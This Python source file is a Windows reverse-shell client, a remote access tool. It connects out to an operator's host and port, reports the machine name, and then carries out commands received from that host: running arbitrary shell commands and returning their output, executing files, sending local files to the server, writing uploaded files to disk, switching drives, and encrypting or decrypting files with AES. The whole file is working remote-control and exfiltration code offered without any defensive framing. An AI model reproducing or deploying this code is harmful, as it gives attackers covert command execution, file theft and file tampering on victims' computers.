import socket
import os
import subprocess
import sys
from AES import AES_Crypto
import io
import threading
from shutil import copyfile

SERVER_HOST = sys.argv[2]
SERVER_PORT = int(sys.argv[1])
print(SERVER_PORT)


msg = ""





class Shell_Client():
    def __init__(self):
        self.conn = self.Get_Connection()
        self.path = os.path.abspath(os.getcwd()) + "\\"
        self.disks = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self.timeout = 5

    def str_to_raw(self, s):
        raw_map = {8: r'\b', 7: r'\a', 12: r'\f', 10: r'\n', 13: r'\r', 9: r'\t', 11: r'\v'}
        return r''.join(i if ord(i) > 32 else raw_map.get(ord(i), i) for i in s)

    def Get_Rid_Of_End_Spaces(self, cmd):
        cnt = -1
        while cmd[cnt] == " ":
            cnt -= 1
        if (cnt == -1):
            return cmd
        print("yes")
        return cmd[:cnt + 1]

    def Get_Rid_Of_Start_Spaces(self, cmd):
        cnt = 0
        while (cmd[cnt] == " "):
            cnt += 1
        return cmd[cnt:]

    def Get_Connection(self):
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to the server
        so.connect((SERVER_HOST, SERVER_PORT))
        so.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return so

    def Send_Requiered_First_Data(self):

        self.conn.send(os.environ['COMPUTERNAME'].encode() + b' ' + self.path.encode())

    def Check_If_File_Exsists(self, command, len):
        # we need to fix the backets...
        file = command[len:]
        file = self.Get_Rid_Of_Start_Spaces(file)
        print(file)
        file = (self.str_to_raw(file))
        if (os.path.isfile(self.path + file)):
            file = self.path + file
            return True, file
        if (os.path.isfile(file)):
            return True, file
        return False, " "

    def Get_Rid_Of_End_Slashes(self, cmd):
        cnt = -1
        while cmd[cnt] == "\\":
            cnt -= 1
        if (cnt == -1):
            return cmd
        print("yes")
        return cmd[:cnt + 1]

    def Nice_Path(srlf, path):
        nice_path = ""
        i = 0
        while (len(path) > i):
            flag = False
            while (len(path) > i and path[i] != "\\"):
                nice_path += path[i]
                i += 1
                flag = True
            if (flag):
                nice_path += "\\"
            i += 1
        return nice_path[:-1]





    def Handel_CD_Command(self, command):
        if (command == "cd .."):
            spl = self.path.split('\\')

            if (len(spl) > 2):
                self.path = ""
                for x in range(0, len(spl) - 2):
                    self.path += spl[x] + "\\"
                msg = 'PATH ' + self.path
            else:
                msg = "You are in the root of your disc!"

        elif "." in command:
            msg = "Please use path names only"

        else:
                path_to_go = self.Get_Rid_Of_Start_Spaces(command[3:])
                path_to_go = path_to_go.replace("/", "\\")
                print(path_to_go)
                path_to_go = self.Get_Rid_Of_End_Spaces(self.Nice_Path(self.str_to_raw(path_to_go)))
                if (path_to_go[0] == '"' and path_to_go[-1] == '"'): # in case its like this "path"
                    path_to_go = path_to_go[1:-1]

                print(path_to_go)
                if os.path.isdir(self.path + "\\" + path_to_go): # if we try to go to dir that inside of the current dir
                    self.path = self.path + self.Get_Rid_Of_End_Slashes(path_to_go) + "\\"
                    msg = 'PATH ' + self.path
                elif (os.path.isdir(path_to_go) and path_to_go.find(":") != -1): # if we want to cd to other path in the computer
                    self.path = self.Get_Rid_Of_End_Slashes(path_to_go) + "\\"
                    msg = 'PATH ' + self.path
                else:
                    msg = "Invalid path!"


        #print(msg)
        self.conn.send(msg.encode())


    def Execute_Thread(self, file):
        os.system('"' + file + '"')

    def Execute_File(self, file):
        exe = threading.Thread(target=self.Execute_Thread, args=(file,))
        exe.start()


    def Execute_Command_in_The_Shell(self, command):
        if (command[6:] == 'dir'):
            proc = subprocess.Popen(command[6:] + ' "' + self.path + '"', shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            proc = subprocess.Popen(command[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
        stdout_val = proc.stdout.read() + proc.stderr.read()

        data_to_server = io.BytesIO(stdout_val)

        self.Send_Large_Data_To_Server(data_to_server)


    def Send_Large_Data_To_Server(self, data):
            f = False
            f1 = data.read(1024)
            while f1:
                if (len(f1) < 1024):
                    self.conn.send(f1 + "+".encode() * (1024 - len(f1)))
                    self.conn.send("END_OF_FILE ".encode() + str((1024 - len(f1))).encode())
                    f = True
                    break
                self.conn.send(f1)
                f1 = data.read(1024)
            if(f == False): # if len(data) % 0 == 1024
                self.conn.send("END_OF_FILE".encode())

    def Backup(self, file):
        i = file.rfind('\\')
        file_place = ""
        if(i == -1):
             file_place = self.path
        else:
            file_place = file[:i]
        file_name = file[i:]
        copyfile(file_place + "\\" + file_name, file_place + "\\" + file_name[:file_name.rfind(".")] + "_backup.enc")
        self.conn.send(("A backup file has been created in this path: " + file_place + "\\" + file_name[:file_name.rfind(".")] + "_backup.enc").encode())

    def Encrypt_File(self, file):

            enc = AES_Crypto()
            key = enc.Create_key(file)
            enc.Encrypt_File(file, key)
            file = file.replace("/", "\\")
            file = self.Get_Rid_Of_End_Spaces(self.Nice_Path(self.str_to_raw(file)))
            msg = "Your file has been encrypted! and was saved as " + file[:file.find('.')] +".enc" + "\nNOTE: Your key is " + key + "\n" + "Use it to decrypt the file!"
            self.conn.send(msg.encode())
            if (self.conn.recv(1024).decode() == 'YES'):
                self.conn.send(str(
                    "File's place : " + file[0: file.rfind('.')] + ".enc\n" + "Decryption KEY: " + key).encode())

    def Decrypt_File(self, file):
        data = self.conn.recv(1024).decode().split(" ")
        key = data[0]
        backup_flag = data[1]
        if(backup_flag == 'Y'):
            self.Backup(file)
        enc = AES_Crypto()
        if(len(key) < 16): # if this is obviously invalid key... [key len supposed to be 16]
            key = enc.pad(key.encode()).decode()

        dec_file = enc.Decrypt_File(file, key)
        dec_file = dec_file.replace("/", "\\")
        dec_file = self.Get_Rid_Of_End_Spaces(self.Nice_Path(self.str_to_raw(dec_file)))
        self.conn.send(dec_file.encode())

    def Get_File_From_Server(self, path_to_save, file_name):
        file = open(path_to_save + "\\" + file_name, 'wb')
        data_to_file = b''
        while True:
            #print('receiving data...')
            data = self.conn.recv(1024)
            if("END_OF_FILE".encode() in data):
                print(data)
                if (len(data.decode().split(" ")) == 2):
                    data_to_file = data_to_file[:-(int(data.decode().split(" ")[1]))]
                break
            data_to_file += data
        #print("ok")
        file.write(data_to_file)
        file.close()
        self.conn.send("The file Has been uploaded".encode())


    def Change(self, command):
        if(self.path[:self.path.find("\\")] == command[7:]):
            self.conn.send("You are in this dick already!".encode())
        else:
            self.path = command[7:] + "\\"
            self.conn.send('PATH '.encode() + self.path.encode())


    def Main_Panel(self):
        self.Send_Requiered_First_Data()
        while True:
            # receive the command from the server
            command = self.conn.recv(1024).decode()
            print(command)
            if command == "exit":
                self.conn.close()
                break
            elif command[0:2] == 'cd':
                self.Handel_CD_Command(command)


            elif command[0:7] == 'execute':
                flag, file = self.Check_If_File_Exsists(command, 8)
                if(flag):
                    msg ="Executed!"
                    self.Execute_File(file)
                else:
                    msg = "File not found"
                self.conn.send(msg.encode())


            elif command[0:5] == 'shell':
                self.Execute_Command_in_The_Shell(command)


            elif command[0:7] == 'timeout':
                self.timeout = int(command.split(" ")[1])
                self.conn.send("Timeout has been updated".encode())





            elif command[0:8] == 'download':

                flag, file = self.Check_If_File_Exsists(command, 9)
                if(flag):
                    msg = "DOWNLOAD"
                    file = open(file, 'rb')
                    self.conn.send(msg.encode())
                    ack = self.conn.recv(1024) # trash
                    self.Send_Large_Data_To_Server(file)
                else:
                    msg = 'Invalid file name\ location!'
                    self.conn.send(msg.encode())


            elif command[0:7] == 'encrypt':
                flag, file = self.Check_If_File_Exsists(command, 8)
                if (flag):
                    self.conn.send("encrypt".encode())
                    self.Encrypt_File(file)
                else:
                    self.conn.send("Invalid file/ path to the file".encode())


            elif command[0:7] == 'decrypt':
                flag, file = self.Check_If_File_Exsists(command, 8)
                if (flag):
                    self.conn.send("decrypt".encode())
                    self.Decrypt_File(file)
                else:
                    self.conn.send("Invalid file/ path to the file".encode())


            elif command[0:6] == 'Upload':
                path_to_save = self.Get_Rid_Of_Start_Spaces(command.split("|")[1])
                path_to_save = self.Get_Rid_Of_End_Spaces(path_to_save)
                file_name = self.Get_Rid_Of_End_Spaces(self.Get_Rid_Of_Start_Spaces(command.split("|")[2]))
                flag = False
                if path_to_save == 'D':
                    path_to_save = self.path
                    flag = True
                else:
                    flag = os.path.isdir(path_to_save)

                if (flag):
                    while(os.path.isfile(path_to_save + "\\" + file_name)):
                        self.conn.send("File_Exsists".encode())
                        ans = self.conn.recv(1024).decode()
                        if(ans == "OVERWRITE"):
                            break
                        file_name = ans
                    #print("123")
                    self.conn.send("SUCCESS".encode())
                    self.Get_File_From_Server(path_to_save, file_name)

                else:
                    self.conn.send("INVALID PATH".encode())

            elif command[0:6] == 'change':
                drives = ['%s:' % d for d in self.disks if os.path.exists('%s:' % d)]
                if command[7:] in drives:
                    self.Change(command)

                else:
                    self.conn.send("Invalid Disk!".encode())



            else:
                msg = 'Invalid command !'
                self.conn.send(msg.encode())


client_shell = Shell_Client()
client_shell.Main_Panel()

